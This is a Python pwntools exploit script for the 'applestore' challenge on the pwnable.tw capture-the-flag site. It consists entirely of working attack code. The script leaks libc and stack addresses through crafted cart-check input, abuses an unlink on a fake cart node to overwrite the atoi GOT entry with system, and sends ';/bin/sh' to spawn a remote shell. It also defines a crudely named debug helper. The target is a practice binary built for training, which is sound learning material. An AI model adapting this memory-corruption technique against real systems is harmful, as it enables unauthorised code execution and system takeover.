#coding=utf-8
from pwn import *
local = 0
exec_file="./applestore"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10104)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x08048BFD
    b *0x080489E0
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(idx):
    a.sendlineafter("> ",str(2))
    a.sendlineafter("Device Number> ",str(idx))
    return 

def delete(idx):
    a.sendlineafter("> ",str(3))
    a.sendlineafter("Item Number> ",idx)
    return 
    
def check_out():
    a.sendlineafter("> ",str(5))
    a.sendlineafter("Let me check your cart. ok? (y/n) > ",'y')
    return 
    
def show(payload):
    a.sendlineafter("> ",str(4))
    a.sendlineafter("Let me check your cart. ok? (y/n) > ",payload)
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

for i in range(6):
    add(1)
for i in range(20):
    add(2)
check_out()
atoi_got = elf.got["atoi"]
payload = "y\x00" + p32(atoi_got)  + p32(0)
show(payload)
a.recvuntil("27: ")
libc_base = u32(a.recv(4)) - libc.sym["atoi"]
fuck(libc_base)#leak libc_base
payload = payload = "y\x00" + p32(libc_base + libc.sym["environ"])  + p32(0)
show(payload)
a.recvuntil("27: " )
stack_addr = u32(a.recv(4)) - 0xc4 -0xc -0x34 -0x8
fuck(stack_addr)

for i in range(19):
    delete(str(7) + '\x00')

payload = "8\x00" + p32(atoi_got) + p32(0)+p32(atoi_got + 0x22) +p32(stack_addr)
#debug()
delete(payload)
payload = p32(libc_base + libc.sym["system"]) + ';' + "/bin/sh\x00"
a.sendlineafter("> ",payload)
a.interactive()
